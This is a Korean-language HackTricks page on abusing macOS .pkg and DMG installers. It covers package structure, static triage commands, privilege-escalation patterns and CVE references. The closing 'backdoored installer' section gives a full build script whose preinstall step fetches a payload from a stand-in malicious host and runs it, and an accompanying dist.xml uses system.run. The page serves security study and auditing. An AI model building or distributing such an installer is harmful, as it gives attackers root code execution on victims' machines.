# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS **installer package**(또는 `.pkg` 파일이라고도 함)는 macOS에서 **software를 배포**하는 데 사용되는 파일 형식입니다. 이러한 파일은 software가 올바르게 설치되고 실행되는 데 필요한 **모든 것을 포함하는 상자**와 같습니다.

패키지 파일 자체는 대상 컴퓨터에 **설치될 파일과 디렉터리의 계층 구조**를 포함하는 archive입니다. 또한 설치 전후에 작업을 수행하는 **scripts**를 포함할 수 있으며, 예를 들어 configuration files 설정이나 이전 software 버전 정리 등이 있습니다.

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: 사용자 지정 항목(title, welcome text…) 및 script/installation checks
- **PackageInfo (xml)**: 정보, install requirements, install location, 실행할 scripts의 paths
- **Bill of materials (bom)**: file permissions와 함께 설치, 업데이트 또는 제거할 files 목록
- **Payload (CPIO archive gzip compressed)**: PackageInfo의 `install-location`에 설치할 files
- **Scripts (CPIO archive gzip compressed)**: 실행을 위해 temp directory에 추출되는 pre 및 post install scripts와 추가 resources

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Installer의 압축을 수동으로 해제하지 않고도 내용을 확인하려면 무료 도구 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)를 사용할 수도 있습니다.

### 정적 triage shortcuts

목표가 분석이라면 먼저 `Installer.app`으로 package를 여는 것을 **피하도록** 하세요. 일부 package는 Installer가 열리는 즉시 code를 실행할 수 있습니다(예: `system.run()` 또는 installer plug-ins를 통해). 따라서 일반적으로 offline extraction부터 시작하는 것이 더 안전합니다.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 기본 정보

DMG 파일 또는 Apple Disk Images는 Apple의 macOS에서 disk image에 사용하는 파일 형식입니다. DMG 파일은 본질적으로 **mountable disk image**(자체 filesystem을 포함)이며, 일반적으로 압축되고 때로는 암호화된 raw block data를 포함합니다. DMG 파일을 열면 macOS는 **물리적 디스크인 것처럼 mount**하므로 해당 콘텐츠에 액세스할 수 있습니다.

> [!CAUTION]
> **`.dmg`** installer는 **매우 다양한 형식**을 지원하므로, 과거에는 vulnerability가 포함된 일부 installer가 **kernel code execution**을 얻는 데 악용되었습니다.

### Disk Image 구조

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 파일의 hierarchy는 콘텐츠에 따라 달라질 수 있습니다. 그러나 application DMG는 일반적으로 다음 구조를 따릅니다.

- Top Level: disk image의 root입니다. 일반적으로 application과 Applications folder로 연결되는 link를 포함합니다.
- Application (.app): 실제 application입니다. macOS에서 application은 일반적으로 application을 구성하는 여러 개별 file과 folder를 포함하는 package입니다.
- Applications Link: macOS의 Applications folder로 연결되는 shortcut입니다. 이 기능의 목적은 application을 쉽게 설치할 수 있도록 하는 것입니다. .app file을 이 shortcut으로 drag하면 app이 설치됩니다.

## pkg abuse를 통한 Privesc

### public directory에서의 실행

pre- 또는 post-installation script가 **`/var/tmp/Installerutil`**과 같은 file을 실행하고 attacker가 해당 file을 교체할 수 있다면, installer가 이를 invoke할 때 attacker는 privileges를 escalate할 수 있습니다. 해당 talks와 walkthrough에서는 이 insecure external-script pattern의 변형을 보여 줍니다.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

이는 여러 installer와 updater가 **root로 무언가를 execute**하기 위해 호출하는 [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)입니다. 이 function은 **execute**할 **file**의 **path**를 parameter로 받지만, attacker가 이 file을 **modify**할 수 있다면 root 권한으로 실행되는 동작을 **abuse**하여 **privileges를 escalate**할 수 있습니다.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
자세한 내용은 다음 강연을 참고하세요: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment 및 shebang 악용

Modern PackageKit 버그는 installer script가 공격자가 제어하는 context를 주변에 유지한 채 **trusted root code**로 실행되는 경우가 많다는 점을 보여주었습니다. vendor package를 audit할 때는 다음 항목에 특히 주의하세요.

- `#!/bin/zsh` / `#!/bin/bash`와 같은 Shell interpreter
- `sudo -u $USER`, `launchctl asuser`와 같은 호출 또는 `$USER`, `$HOME`, `PATH`, `TMPDIR`, 상대 경로를 신뢰하는 모든 logic
- 사용자 제어 init file 또는 library를 로드할 수 있는 non-shell interpreter
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024년 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs)에 대해서는 [the generic macOS privesc page](../macos-privilege-escalation.md)를 확인하세요. 패키지가 **Apple-signed**인 경우, `system_installd`가 `com.apple.rootless.install.heritable`을 포함할 수 있으므로 동일한 script bug가 **SIP/TCC-relevant**해질 수 있습니다. 자세한 내용은 [the SIP page](../macos-security-protections/macos-sip.md)를 참조하세요.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### 마운트를 통한 실행

installer가 `/tmp/fixedname/bla/bla`에 기록한다면, `/tmp/fixedname` 위에 noowners로 **mount를 생성**할 수 있으므로 **설치 중 모든 파일을 수정**하여 installation process를 악용할 수 있습니다.

이러한 예로 **CVE-2021-26089**가 있으며, 이를 통해 **periodic script를 덮어써서** root 권한으로 실행할 수 있었습니다. 자세한 내용은 다음 강연을 참고하세요: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg를 malware로 사용

### 빈 Payload

실제 Payload 없이 scripts 내부의 malware만 포함한 **`.pkg`** 파일을 **pre 및 post-install scripts**와 함께 생성할 수 있습니다.<sup>[[2]](#references)</sup>

### Distribution xml의 JS

패키지의 **distribution xml** 파일에 **`<script>`** tags를 추가할 수 있으며, 해당 code가 실행되어 **`system.run`**을 사용한 **commands 실행**이 가능합니다:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages에서는 일반적으로 최상위 `Distribution` 파일이 외부 scripts를 활성화하는지에 따라 달라지며, 예를 들어 `allow-external-scripts="true"`를 사용할 수 있습니다. 따라서 `preinstall` / `postinstall`만 검토하는 것으로는 충분하지 않습니다. **Distribution XML 자체**에 `installation-check` / `volume-check` hooks와 직접적인 `system.run()` / `system.runOnce()` execution paths가 포함될 수 있습니다.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 백도어가 삽입된 Installer

dist.xml 내부의 script 및 JS code를 사용하는 malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgs Unpacking: macOS Installer Packages 내부 살펴보기 및 일반적인 보안 취약점](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installers의 거친 세계" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgs Unpacking: macOS Installer Packages 내부 살펴보기](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages Exploiting](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages로 SIP Breaking](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS에서 1000개의 Installers로 인한 죽음, 그리고 모든 것이 망가졌다!](https://www.youtube.com/watch?v=lTOItyjTTkw)
{{#include ../../../banners/hacktricks-training.md}}
